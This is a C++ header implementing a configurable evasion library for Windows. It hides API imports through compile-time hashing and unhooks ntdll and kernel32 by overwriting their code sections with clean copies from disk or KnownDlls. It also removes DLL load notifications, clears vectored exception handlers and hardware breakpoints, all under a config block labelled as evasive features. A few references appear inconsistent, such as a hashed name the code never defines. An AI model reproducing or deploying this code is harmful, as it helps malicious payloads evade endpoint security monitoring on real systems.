//////////////////////////////////////////////////////////////////////////////////////////
/// Compile-Time C++17 configurable API hashing by @rad9800
/// Thank you to the following individuals:
/// - @peterwintrsmith 
///	- @modexpblog
/// - @jonaslyk
///	- @JustasMasiulis
//////////////////////////////////////////////////////////////////////////////////////////

#ifndef WTSRM2_HPP
#define WTSRM2_HPP

#include <Windows.h>
#include <winternl.h>
#include <type_traits>

//////////////////////////////////////////////////////////////////////////////////////////
// WTSRM2 Configuration
#define HASHING_ALGORITHM hash_string_fnv1a	// constexpr algorithm

namespace config
{
	enum unhook_source : unsigned
	{
		none,		// leave hooked
		knowndlls = 1 << 1, // Tries to unhook from \KnownDlls\dll_name
		system32 = 1 << 2, // Tries to unhook from \System32\dll_name
	};

	enum unhook_protection_method : unsigned
	{
		virtual_protect = 1 << 3,
		write_process_memory = 1 << 4,
	};

	//
	// configure behaviour
	//
	inline constexpr unsigned unhooking = system32 | write_process_memory;
	inline constexpr auto work_item_load_library = true; // use a work item for LL

	//
	// configure evasive features
	//
	inline constexpr auto clear_and_restore_veh = true; // clear and restore veh
	inline constexpr auto unregister_dll_notifs = true; // LdrRegisterDllNotification
	inline constexpr auto clear_thread_hwbps = true; // clear the hwbps
}

//////////////////////////////////////////////////////////////////////////////////////////

#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#define NtCurrentThread() ((HANDLE)(LONG_PTR)-2)

//
// Generic template function
//
#pragma region generics

template <typename T>
T rva2_va(LPVOID base, const DWORD rva)
{
	return reinterpret_cast<T>(reinterpret_cast<ULONG_PTR>(base) + rva);
}

template <typename T>
std::enable_if_t<std::is_trivial_v<T>, void>
__forceinline swap(T& x, T& y) noexcept
{
	T t = x;
	x = y;
	y = t;
}

template <typename T>
std::enable_if_t<std::is_same_v<T, char> || std::is_same_v<T, wchar_t>, T>
to_uppercase(T c)
{
	if (c >= 'a' && c <= 'z')
	{
		return c - 32;
	}

	return c;
}

template <typename T>
std::enable_if_t<std::is_same_v<T, char> || std::is_same_v<T, wchar_t>, int>
string_cmp(const T* str1, const T* str2) {
	int result = 0;
	while (*str1 != '\0' && *str2 != '\0') {
		result = to_uppercase(*str1) - to_uppercase(*str2);
		if (result != 0) return result;
		++str1;
		++str2;
	}
	return *str1 - *str2;
}

inline size_t _wcslen(const wchar_t* str) {
	size_t len = 0;
	while (str[len] != L'\0') ++len;
	return len;
}

template <typename T, size_t N>
errno_t _wcscpy_s(T(&dest)[N], const wchar_t* src) {
	if (!src || N == 0) return EINVAL;
	size_t src_len = _wcslen(src);
	if (src_len >= N) return ERANGE;
	for (size_t i = 0; i < src_len + 1; ++i) {
		dest[i] = src[i];
	}
	return 0;
}

template <typename T, std::size_t N>
errno_t _wcscat_s(T(&dest)[N], const wchar_t* src) {
	if (!src || N == 0) return EINVAL;
	const size_t dest_len = _wcslen(dest);
	if (dest_len >= N) return ERANGE;
	const size_t src_len = _wcslen(src);
	if (src_len + dest_len >= N) return ERANGE;
	for (size_t i = 0; i < src_len; i++) {
		dest[dest_len + i] = src[i];
	}
	return 0;
}

//
// Disable /GL
//
#pragma function(memcpy)
extern "C" void* memcpy(void* dest, const void* src, const size_t n) {
	const auto dest_ptr = static_cast<char*>(dest);
	const auto src_ptr = static_cast<const char*>(src);
	for (size_t i = 0; i < n; ++i) {
		dest_ptr[i] = src_ptr[i];
	}
	return dest;
}

void _memset(void* dst, const BYTE val, const size_t n) {
	for (volatile size_t i = 0; i < n; i++) {
		reinterpret_cast<BYTE*>(dst)[i] = val;
	}
}


#define PRINT( STR, ... )                                                                   \
    if (1) {                                                                                \
        auto buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );			\
        if ( buf != nullptr ) {																\
            auto len = wsprintfA( buf, STR, __VA_ARGS__ );                                  \
            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  


#pragma endregion

//
// Defined algorithms and required macros for API hashing
//
#pragma region hashing

#pragma region algorithms

#define TRIVIAL_TYPE_CHECK() static_assert(std::is_trivial_v<T>, "T must be trivial to be hashed.");

template <typename T>
constexpr auto hash_string_fnv1a(const T* buffer)
{
	TRIVIAL_TYPE_CHECK()

		ULONG hash = 0x811c9dc5;
	while (*buffer)
	{
		hash ^= static_cast<ULONG>(*buffer++);
		hash *= 0x01000193;
	}

	return hash;
}

template <typename T>
constexpr auto hash_string_djb2(const T* buffer)
{
	TRIVIAL_TYPE_CHECK()

		ULONG hash = 5381;
	INT c = 0;

	while ((c = *buffer++))
	{
		hash = ((hash << 5) + hash) + c;
	}

	return hash;
}

#pragma endregion

#pragma region macros

#define TOKENIZEA(x) #x
#define TOKENIZEW(x) L#x
#define CONCAT(x, y) x##y

#define HASH_STRING(string) constexpr auto CONCAT(hash_, string) = HASHING_ALGORITHM(TOKENIZEA(string));
#define DLL_HASH(dll_name, string) constexpr auto CONCAT(hash_, dll_name) = HASHING_ALGORITHM(string);
#define HASH_FUNC(FUNCTION, RETURN, ...) \
	HASH_STRING(FUNCTION) typedef RETURN(WINAPI* CONCAT(type_, FUNCTION))(__VA_ARGS__);
#define API(FUNCTION)((CONCAT(type_, FUNCTION))get_proc_address(CONCAT(hash_, FUNCTION)))

#pragma endregion macros

#pragma endregion

//
// Define the required DLLs *UPPER-CASED* here and in the module_address_table
//
DLL_HASH(NTDLL, L"NTDLL.DLL")
DLL_HASH(KERNEL32, L"KERNEL32.DLL")
DLL_HASH(DBGHELP, L"DBGHELP.DLL")

//
// Define the required functions in here and the api_address_table
//
HASH_FUNC(GetProcAddress, FARPROC, HMODULE, LPCSTR)
HASH_FUNC(NtUnmapViewOfSection, NTSTATUS, HANDLE, PVOID)
HASH_FUNC(NtProtectVirtualMemory, NTSTATUS, HANDLE, PVOID*, PULONG, ULONG, PULONG)
HASH_FUNC(NtOpenSection, NTSTATUS, HANDLE*, ACCESS_MASK, OBJECT_ATTRIBUTES*)
HASH_FUNC(NtMapViewOfSection, NTSTATUS, HANDLE, HANDLE, PVOID, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG,
	ULONG)
HASH_FUNC(NtSetInformationProcess, NTSTATUS, HANDLE, PROCESSINFOCLASS, PVOID, ULONG)
HASH_FUNC(RtlInitUnicodeString, VOID, PUNICODE_STRING, PCWSTR)
HASH_FUNC(CloseHandle, BOOL, HANDLE)
HASH_FUNC(GetSystemDirectoryW, UINT, LPWSTR, UINT)
HASH_FUNC(CreateFileW, HANDLE, LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE)
HASH_FUNC(CreateFileMapping, HANDLE, HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR)
HASH_FUNC(MapViewOfFile, LPVOID, HANDLE, DWORD, DWORD, DWORD, SIZE_T)
HASH_FUNC(UnmapViewOfFile, BOOL, LPCVOID)
HASH_FUNC(LoadLibraryW, HMODULE, LPCWSTR)
HASH_FUNC(NtWaitForSingleObject, NTSTATUS, HANDLE, BOOLEAN, PLARGE_INTEGER)
HASH_FUNC(RtlQueueWorkItem, NTSTATUS, PVOID, PVOID, ULONG)
HASH_FUNC(VirtualProtect, BOOL, LPVOID, SIZE_T, DWORD, PDWORD)
HASH_FUNC(LdrRegisterDllNotification, NTSTATUS, ULONG, void(__stdcall* LdrDllNotification)(ULONG, PVOID, PVOID), PVOID, PVOID*)
HASH_FUNC(LdrUnregisterDllNotification, NTSTATUS, PVOID)
HASH_FUNC(CancelThreadpoolIo, PVOID, PVOID, PVECTORED_EXCEPTION_HANDLER)
HASH_FUNC(WriteProcessMemory, BOOL, HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*)

//
// PEB manipulation and introspection functions
//
#pragma region peb

inline BOOL get_ntdll_section_va(const PCSTR section_name, PVOID* section_va, DWORD* section_sz)
{
	const LIST_ENTRY* head =
		&NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList;
	LIST_ENTRY* next = head->Flink;

	while (next != head)
	{
		wchar_t upper_dll_name[64]{ 0 };
		const auto entry = CONTAINING_RECORD(next, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		const auto dll_name = reinterpret_cast<UNICODE_STRING*>(reinterpret_cast<BYTE*>(&entry->FullDllName) + sizeof(
			UNICODE_STRING));

		if (dll_name->Length < sizeof upper_dll_name - 1)
		{
			for (auto i = 0; i < dll_name->Length && dll_name->Buffer[i]; i++)
			{
				upper_dll_name[i] = to_uppercase(dll_name->Buffer[i]);
			}

			const auto upper_dll_hash = HASHING_ALGORITHM(upper_dll_name);

			if (upper_dll_hash == hash_NTDLL)
			{
				const auto dos = static_cast<PIMAGE_DOS_HEADER>(entry->DllBase);
				const auto nt = rva2_va<PIMAGE_NT_HEADERS>(entry->DllBase, dos->e_lfanew);

				for (int j = 0; j < nt->FileHeader.NumberOfSections; j++)
				{
					const auto section = rva2_va<PIMAGE_SECTION_HEADER>(
						IMAGE_FIRST_SECTION(nt), IMAGE_SIZEOF_SECTION_HEADER * j);

					if (string_cmp(reinterpret_cast<char*>(section->Name), section_name) == 0)
					{
						*section_va = rva2_va<PVOID>(entry->DllBase, section->VirtualAddress);
						*section_sz = section->Misc.VirtualSize;

						return TRUE;
					}
				}
			}
		}
		
		next = next->Flink;
	}
	return FALSE;
}

inline PVOID get_module_handle(const LPCWSTR library_name)
{
	const LIST_ENTRY* head = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList;
	LIST_ENTRY* next = head->Flink;

	while (next != head)
	{
		const auto entry = CONTAINING_RECORD(next, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		const auto dll_name = reinterpret_cast<UNICODE_STRING*>(reinterpret_cast<BYTE*>(&entry->FullDllName) + sizeof(
			UNICODE_STRING));

		if (string_cmp(library_name, dll_name->Buffer) == 0)
		{
			return entry->DllBase;
		}
		next = next->Flink;
	}

	return nullptr;
}

#pragma endregion

//
// Module and API address tables of type addr_struct
//
#pragma region IAT


template <typename T, typename S>
struct addr_struct
{
	T hash; // target hash
	PVOID address; // resolved address
};

template <typename T>
struct addr_struct<T, wchar_t>
{
	T hash; // target hash
	PVOID address; // resolved address
	wchar_t dll_name[64]; // save the DLL name
};

inline addr_struct<decltype(HASHING_ALGORITHM(TOKENIZEA(T))), wchar_t> module_address_table[] =
{
	{hash_NTDLL, nullptr,},
	{hash_KERNEL32, nullptr,},
	{hash_DBGHELP, nullptr, L"DBGHELP.DLL"}
};

inline addr_struct<decltype(HASHING_ALGORITHM(TOKENIZEA(T))), void> api_address_table[] =
{
	{hash_GetProcAddress, nullptr},			// this must be here so we can resolve forwarded imports lazily
	{hash_NtUnmapViewOfSection, nullptr},
	{hash_NtProtectVirtualMemory, nullptr},
	{hash_NtOpenSection, nullptr},
	{hash_NtMapViewOfSection, nullptr},
	{hash_NtSetInformationProcess, nullptr},
	{hash_RtlInitUnicodeString, nullptr},
	{hash_GetSystemDirectoryW, nullptr},
	{hash_CreateFileW, nullptr},
	{hash_CreateFileMappingW, nullptr},
	{hash_MapViewOfFile, nullptr},
	{hash_UnmapViewOfFile, nullptr},
	{hash_LoadLibraryW, nullptr},
	{hash_CloseHandle, nullptr},
	{hash_NtWaitForSingleObject, nullptr},
	{hash_RtlQueueWorkItem, nullptr},
	{hash_VirtualProtect, nullptr},
	{hash_LdrRegisterDllNotification, nullptr},
	{hash_LdrUnregisterDllNotification, nullptr},
	{hash_CancelThreadpoolIo, nullptr},
	{hash_WriteProcessMemory, nullptr}
};

DWORD64 empty_function()
{
	return static_cast<DWORD64>(-1);
}

template<typename T>
__forceinline PVOID get_proc_address(T function_hash)
{
	for (auto& [api_hash, api_address] : api_address_table)
	{
		if (function_hash == api_hash)
			return api_address;
	}
	//
	// avoid crashing
	//
	return &empty_function;
}

#pragma endregion


#pragma region clear

//
// Functions response for clearing DLL notifications
//
#pragma region dlls

VOID dummy_dll_load_callback(ULONG NotificationReason, const PVOID NotificationData, PVOID Context) { }

LIST_ENTRY* get_dll_load_notifications()
{
	PVOID cookie = nullptr;
	NTSTATUS status = API(LdrRegisterDllNotification)(0, dummy_dll_load_callback, nullptr, &cookie);
	if (cookie == nullptr) return nullptr;
	const auto LdrpDllNotificationList = static_cast<LIST_ENTRY*>(cookie);
	auto LdrpDllNotificationListNext = LdrpDllNotificationList->Flink;

	PVOID section_va;
	DWORD section_sz;

	//
	// LdrpVectorHandlerList will be found in the .data section of NTDLL.dll
	//
	if (get_ntdll_section_va(".data", &section_va, &section_sz))
	{
		while (LdrpDllNotificationListNext != LdrpDllNotificationList)
		{
			if (LdrpDllNotificationListNext >= section_va &&
				LdrpDllNotificationListNext <= rva2_va<PVOID>(section_va, section_sz))
			{
				API(LdrUnregisterDllNotification)(cookie);

				return LdrpDllNotificationListNext;
			}
			LdrpDllNotificationListNext = LdrpDllNotificationListNext->Flink;
		}
	}

	return nullptr;
}

inline LIST_ENTRY* remove_dll_load_notifications()
{
	LIST_ENTRY* dll_notification_list = nullptr;
	if ((dll_notification_list = get_dll_load_notifications()) != nullptr)
	{
		const auto head = dll_notification_list;
		auto next = dll_notification_list->Flink;
		while (next != head)
		{
			PRINT("[+] Removing dll load notification 0x%p\n", next)

			const auto old_flink = next->Flink;
			const auto old_blink = next->Blink;
			old_flink->Blink = old_blink;
			old_blink->Flink = old_flink;
			next->Flink = nullptr;
			next->Blink = nullptr;

			next = old_flink;
		}
	}
	return dll_notification_list;
}

#pragma endregion

//
// Functions responsible for clearing VEH
//
#pragma region veh

typedef struct _VECTXCPT_CALLOUT_ENTRY
{
	LIST_ENTRY Links;
	PVOID reserved[2];
	PVECTORED_EXCEPTION_HANDLER VectoredHandler;
} VECTXCPT_CALLOUT_ENTRY, * PVECTXCPT_CALLOUT_ENTRY;

PVECTXCPT_CALLOUT_ENTRY veh_handles[64];
unsigned veh_counter = 0;

LONG WINAPI dummy_exception_handler(PEXCEPTION_POINTERS exception_info)
{
	return 0;
}

PVOID find_LdrpVectorHandlerList()
{
	BOOL found = FALSE;

	//
	// Register a fake handler
	//
	const PVOID dummy_handler = AddVectoredExceptionHandler(0, &dummy_exception_handler);

	if (dummy_handler == nullptr)
		return nullptr;

	PLIST_ENTRY next = static_cast<PLIST_ENTRY>(dummy_handler)->Flink;

	PVOID section_va;
	DWORD section_sz;

	//
	// LdrpVectorHandlerList will be found in the .data section of NTDLL.dll
	//
	if (get_ntdll_section_va(".data", &section_va, &section_sz))
	{
		while (static_cast<PVOID>(next) != dummy_handler)
		{
			if (static_cast<PVOID>(next) >= section_va &&
				static_cast<PVOID>(next) <= static_cast<PVOID*>(section_va) + section_sz)
			{
				found = TRUE;
				break;
			}

			next = next->Flink;
		}
	}

	//
	// Cleanup after ourselves..
	//
	RemoveVectoredExceptionHandler(dummy_handler);

	return found ? next : nullptr;
}

BOOL clear_veh()
{
	const PVOID LdrpVectorHandlerList = find_LdrpVectorHandlerList();
	if (LdrpVectorHandlerList == nullptr) return FALSE;
	auto next = static_cast<PLIST_ENTRY>(LdrpVectorHandlerList)->Flink;

	for (; next != LdrpVectorHandlerList && veh_counter < 64;
		veh_counter++, next = next->Flink)
	{
		PRINT("[+] Removing Vectored Exception Handler:\t0x%p\n", next);
		veh_handles[veh_counter] = reinterpret_cast<PVECTXCPT_CALLOUT_ENTRY>(next);
	}

	for (unsigned i = 0; i < veh_counter; i++)
	{
		RemoveVectoredExceptionHandler(veh_handles[i]);
	}

	return veh_counter ? TRUE : FALSE;
}

inline void restore_veh()
{
	PVOID LdrpVectorHandlerList = find_LdrpVectorHandlerList();
	if (LdrpVectorHandlerList == nullptr) return;
	auto next = static_cast<PLIST_ENTRY>(LdrpVectorHandlerList)->Flink;

	//
	// Re-register the saved exception handlers
	//
	for (unsigned i = 0; i < veh_counter; i++)
	{
		PRINT("[+] Restoring Vectored Exception Handler:\t0x%p\n", DecodePointer(veh_handles[i]->VectoredHandler));
		AddVectoredExceptionHandler(
			0, static_cast<PVECTORED_EXCEPTION_HANDLER>(DecodePointer(veh_handles[i]->VectoredHandler)));
	}
	veh_counter = 0;

	////
	//// Observe our re-registered handlers
	////
	//for (next = static_cast<PLIST_ENTRY>(LdrpVectorHandlerList)->Flink;
	//	next != LdrpVectorHandlerList; next = next->Flink)
	//{
	//	PRINT("Checking Handler:\t0x%p\n",
	//		DecodePointer(((PVECTXCPT_CALLOUT_ENTRY)next)->VectoredHandler));
	//}
}

#pragma endregion

//
// Functions responsible for clearing DRs
//
#pragma region HWBP

inline BOOL clear_hwbps()
{
	CONTEXT context;
	context.ContextFlags = CONTEXT_DEBUG_REGISTERS;

	BOOL ret = FALSE;

	do
	{
		if (!GetThreadContext(GetCurrentThread(), &context))
			break;

		//
		// We only want to set thread context IF they are set
		//
		if (context.Dr7)
		{
			PRINT("[+] Clearning HWBPs\n")
			memset(&context.Dr0, 0, sizeof(context.Dr0) * 6);


			if (!SetThreadContext(GetCurrentThread(), &context))
				break;
		}

		ret = TRUE;
	} while (FALSE);

	return ret;
}

#pragma endregion

#pragma endregion

//
// Core wtsrm2 initialization function
//
#pragma region wtsrm2

inline void wtsrm2_init(const PPEB peb)
{
	if constexpr (config::clear_and_restore_veh) clear_veh();
	if constexpr (config::clear_thread_hwbps) clear_hwbps();

	const auto head = &peb->Ldr->InMemoryOrderModuleList;
	auto next = head->Flink;

	while (next != head)
	{
		wchar_t upper_dll_name[64];
		_memset(upper_dll_name, 0, sizeof(upper_dll_name));
		const auto entry = CONTAINING_RECORD(next, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		const auto dll_name = reinterpret_cast<UNICODE_STRING*>(reinterpret_cast<BYTE*>(&entry->FullDllName) + sizeof(
			UNICODE_STRING));

		if (dll_name->Length < sizeof upper_dll_name - 1)
		{
			for (auto i = 0; i < dll_name->Length && dll_name->Buffer[i]; i++)
			{
				upper_dll_name[i] = to_uppercase(dll_name->Buffer[i]);
			}

			const auto upper_dll_hash = HASHING_ALGORITHM(upper_dll_name);

			for (auto& [mat_hash, mat_address, name] : module_address_table)
			{
				if (mat_hash == upper_dll_hash)
				{
					_wcscpy_s(name, upper_dll_name);
					mat_address = entry->DllBase;
				}
			}
		}
		next = next->Flink;
	}

	//
	// Chicken-egg problem...
	// We pay the price ONCE as opposed to OVER and OVER
	//https://en.cppreference.com/w/cpp/language/sfinae
	for (DWORD counter = 0; counter < 2; counter++)
	{
		if (counter == 1)
		{
			if constexpr (config::unregister_dll_notifs) remove_dll_load_notifications();

			for (auto& [_, dll_base, dll_name] : module_address_table)
			{
				if (dll_base == nullptr)
				{
					if constexpr (config::work_item_load_library)
					{
						if (NT_SUCCESS(API(RtlQueueWorkItem)(get_proc_address(hash_LoadLibraryW), reinterpret_cast<PVOID>(dll_name), WT_EXECUTEDEFAULT)))
						{
							LARGE_INTEGER timeout;
							timeout.QuadPart = -500000;
							API(NtWaitForSingleObject)(NtCurrentProcess(), FALSE, &timeout);
						}
					}
					else
					{
						API(LoadLibraryW)(dll_name);
					}

					dll_base = get_module_handle(dll_name);

					PRINT("[+] Loaded DLL: %S at 0x%p\n", dll_name, dll_base);
				}
			}
		}

		for (auto& [_, dll_base, dll_name] : module_address_table)
		{
			if (dll_base == nullptr) continue;

			const auto dos = static_cast<PIMAGE_DOS_HEADER>(dll_base);
			const auto nt = rva2_va<PIMAGE_NT_HEADERS>(dll_base, dos->e_lfanew);
			const auto exports = rva2_va<PIMAGE_EXPORT_DIRECTORY>(
				dll_base, nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
			const auto optional = &nt->OptionalHeader;

			if (exports->AddressOfNames == 0) continue;

			const auto ordinals = rva2_va<PWORD>(dll_base, exports->AddressOfNameOrdinals);
			const auto names = rva2_va<PDWORD>(dll_base, exports->AddressOfNames);
			const auto functions = rva2_va<PDWORD>(dll_base, exports->AddressOfFunctions);

			for (DWORD i = 0; i < exports->NumberOfNames; i++)
			{
				const auto name = rva2_va<LPSTR>(dll_base, names[i]);
				const auto hash = HASHING_ALGORITHM(name);

				for (auto& [api_hash, api_address] : api_address_table)
				{
					if (api_hash == hash)
					{
						PVOID function_address = rva2_va<BYTE*>(dll_base, functions[ordinals[i]]);
						//
						// Handle forwarded functions
						//
						const auto optional_start = rva2_va<PVOID>(dll_base, optional->DataDirectory[0].VirtualAddress);
						const auto optional_end = rva2_va<PVOID>(optional_start, optional->DataDirectory[0].Size);
						if (counter == 1 && function_address >= optional_start && function_address < optional_end)
						{
							function_address = API(GetProcAddress)(static_cast<HMODULE>(dll_base), name);
						}
						api_address = function_address;
					}
				}
			}
		}
	}

	if constexpr (config::unhooking != config::unhook_source::none)
	{
		for (auto& [_, dll_base, dll_name] : module_address_table)
		{
			if (dll_base == nullptr) continue;

			const auto dos = static_cast<PIMAGE_DOS_HEADER>(dll_base);
			const auto nt = rva2_va<PIMAGE_NT_HEADERS>(dll_base, dos->e_lfanew);

			for (DWORD i = 0; i < nt->FileHeader.NumberOfSections; i++)
			{
				const auto section = rva2_va<PIMAGE_SECTION_HEADER>(
					IMAGE_FIRST_SECTION(nt), IMAGE_SIZEOF_SECTION_HEADER * i);

				if ((*(ULONG*)section->Name | 0x20202020) == 'xet.')
				{
					WCHAR dll_buffer[_MAX_PATH];
					_memset(dll_buffer, 0, _MAX_PATH);
					PVOID mapped_dll_base = nullptr;

					auto dll_handle = INVALID_HANDLE_VALUE;

					//
					// Pick which way we'll load a DLL 
					//
					if constexpr ((config::unhooking & config::unhook_source::knowndlls) != 0)
					{
						UNICODE_STRING known_dll_string;
						OBJECT_ATTRIBUTES object_attributes;
						ULONG_PTR dll_size = 0;

						_wcscpy_s
						(dll_buffer, L"\\KnownDlls\\");
						_wcscat_s(dll_buffer, dll_name);

						API(RtlInitUnicodeString)(&known_dll_string, dll_buffer);
						InitializeObjectAttributes(&object_attributes, &known_dll_string, OBJ_CASE_INSENSITIVE, NULL,
							NULL)

						NTSTATUS status = API(NtOpenSection)(&dll_handle, SECTION_MAP_READ | SECTION_MAP_EXECUTE,
							&object_attributes);

						if (!NT_SUCCESS(status)) continue;

						status = API(NtMapViewOfSection)(dll_handle, NtCurrentProcess(), &mapped_dll_base, 0, 0, nullptr,
							&dll_size, 1, 0, PAGE_READONLY);
					}

					if constexpr ((config::unhooking & config::unhook_source::system32) != 0)
					{
						if (API(GetSystemDirectoryW)(dll_buffer, _MAX_PATH) == 0) continue;
						_wcscat_s(dll_buffer, L"\\");
						_wcscat_s(dll_buffer, dll_name);

						const auto dll_file_handle = API(CreateFileW)(dll_buffer, GENERIC_READ, FILE_SHARE_READ,
							nullptr, OPEN_EXISTING, 0, nullptr);
						if (dll_file_handle == INVALID_HANDLE_VALUE) continue;

						const auto dll_file_mapping = API(CreateFileMapping)(
							dll_file_handle, nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, nullptr);
						if (dll_file_mapping == INVALID_HANDLE_VALUE) goto cleanup;

						mapped_dll_base = API(MapViewOfFile)(dll_file_mapping, FILE_MAP_READ, 0, 0, 0);


					cleanup:
						API(CloseHandle)(dll_file_mapping);
						API(CloseHandle)(dll_file_handle);

					}

					if (mapped_dll_base == nullptr) continue;

					PRINT("Unhooking %S with %S (0x%p)\n", dll_name, dll_buffer, mapped_dll_base);

					const auto section_base = rva2_va<LPVOID>(dll_base, section->VirtualAddress);
					const ULONG size = section->Misc.VirtualSize;

					if constexpr ((config::unhooking & config::unhook_protection_method::virtual_protect) != 0)
					{
						DWORD old_protect = 0;
						if (API(VirtualProtect)(section_base, size, PAGE_EXECUTE_READWRITE, &old_protect))
						{
								memcpy(
									rva2_va<LPVOID>(dll_base, section->VirtualAddress),
									rva2_va<LPVOID>(mapped_dll_base, section->VirtualAddress),
									section->Misc.VirtualSize
								);

							API(VirtualProtect)(section_base, size, old_protect, &old_protect);
						}
					}

					if constexpr ((config::unhooking & config::unhook_protection_method::write_process_memory) != 0)
					{
						size_t written = 0;
						API(WriteProcessMemory)(NtCurrentProcess(), rva2_va<LPVOID>(dll_base, section->VirtualAddress),
							rva2_va<LPVOID>(mapped_dll_base, section->VirtualAddress), section->Misc.VirtualSize, &written);
					}


				cleanup2:
					if constexpr ((config::unhooking & config::unhook_source::knowndlls) != 0)
						API(NtUnmapViewOfSection)(NtCurrentProcess(), mapped_dll_base);

					if constexpr ((config::unhooking & config::unhook_source::system32) != 0)
						API(UnmapViewOfFile)(mapped_dll_base);
				}
			}
		}
	}

	if constexpr (config::clear_and_restore_veh) restore_veh();

}

#pragma endregion

#endif // WTSRM2_HPP
